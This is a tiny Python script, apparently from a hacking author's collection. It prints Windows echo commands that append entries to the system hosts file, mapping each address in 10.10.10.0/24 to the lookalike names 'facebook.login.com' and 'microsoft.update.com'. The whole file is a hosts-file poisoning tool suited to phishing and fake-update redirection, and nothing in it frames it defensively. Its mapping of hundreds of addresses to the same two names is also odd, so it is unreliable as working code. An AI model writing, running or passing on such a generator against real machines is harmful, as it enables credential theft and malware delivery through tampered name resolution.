#!/usr/bin/python3
# Author @nu11secur1ty
# v-1.0
import ipaddress
for ip in ipaddress.IPv4Network('10.10.10.0/24'):
    host = "facebook.login.com >> %WINDIR%\System32\Drivers\Etc\Hosts"
    host2 = "microsoft.update.com >> %WINDIR%\System32\Drivers\Etc\Hosts"
    print("echo",'',ip,'','','',host)
    print("echo",'',ip,'','','',host2)
